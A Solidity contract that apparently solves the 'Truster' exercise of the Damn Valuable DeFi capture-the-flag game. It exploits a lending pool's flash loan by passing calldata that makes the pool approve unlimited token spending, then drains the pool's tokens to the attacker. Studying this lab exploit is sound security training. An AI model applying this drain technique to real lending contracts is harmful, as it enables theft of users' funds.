pragma solidity ^0.8.0;

import "./TrusterLenderPool.sol";
import "../DamnValuableToken.sol";
import "hardhat/console.sol";

contract AttackerTruster {
    TrusterLenderPool private pool;
    DamnValuableToken private token;
    address private owner;

    uint256 constant AMOUNT = 1 ether;

    constructor (TrusterLenderPool pool_, DamnValuableToken token_) {
        pool = pool_;
        owner = msg.sender;
        token = token_;
    }

    function attack(uint256 amount) external {
        bytes memory data = abi.encodeWithSignature("approve(address,uint256)", address(this), type(uint256).max);
        pool.flashLoan(AMOUNT, address(this), address(token), data);

        token.transferFrom(address(pool), owner, amount);
    }

    fallback() external payable {
        // repay
        token.transfer(address(pool), AMOUNT);
    }
}